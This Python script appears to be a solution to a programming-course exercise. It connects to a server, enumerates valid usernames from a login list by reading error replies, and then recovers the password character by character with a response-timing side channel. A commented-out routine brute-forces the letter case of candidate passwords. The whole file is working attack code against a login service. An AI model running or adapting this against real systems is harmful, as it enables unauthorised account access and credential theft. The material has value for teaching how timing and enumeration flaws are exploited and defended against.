# write your code here
import socket
import sys
import string
import itertools
import json
from datetime import datetime
from time import sleep

passletters=string.digits+string.ascii_letters

def readfile(file):
    while True:
        row = file.readline().replace('\n','')
        if not row:
            break
        yield row

# def searchPassword(client_socket,password):
#     passwords=map(''.join, itertools.product(*zip(password.upper(), password.lower())))
#     for pw in passwords:
#         try:
#             message=pw.encode()
#             client_socket.send(message)
#             response=client_socket.recv(1024)
#             response=response.decode()
#             if response=='Connection success!':
#                 print(pw)
#                 client_socket.close()
#                 break
#         except:
#                 break

def searchlogin(client_socket,login):
    # logins=map(''.join, itertools.product(*zip(login.upper(), login.lower())))
    message_json=json.dumps({"login":login, 'password':' '})
    try:
        message=message_json.encode()
        client_socket.sendall(message)
        response=client_socket.recv(1024)
        response=response.decode()
        response_json=json.loads(response)
        if response_json['result']=='Wrong password!':
            return login
    except:
            return None


def searchPassword(client_socket, login):
    letters=['']
    while True:
        for letter in passletters:
            newletters=letters.copy()
            try:
                newletters.append(letter)
                newpassword=''.join(newletters)
                message_json=json.dumps({"login":login, 'password':newpassword})
                message=message_json.encode()
                start=datetime.now()

                client_socket.sendall(message)
                response=client_socket.recv(1024)

                finish=datetime.now()
                diff=(finish-start).microseconds

                response=response.decode()
                response_json=json.loads(response)
                if response_json['result']=='Connection success!':
                    print(message_json)
                    client_socket.close()
                    break
                elif diff>100000:
                    letters.append(letter)
                    break
            except Exception as e:
                print(e.__class__)
                break

        if response_json['result']=='Connection success!':
            break
        elif diff>100000:
            continue
        else:
            break

args=sys.argv
host_name=args[1]
port=int(args[2])
address=(host_name,port)
client_socket=socket.socket()
client_socket.connect(address)


with open('logins.txt','r') as file:
    for piece in readfile(file):
        login=searchlogin(client_socket,piece)
        if login:
            break
    searchPassword(client_socket,login)
        # print(piece)
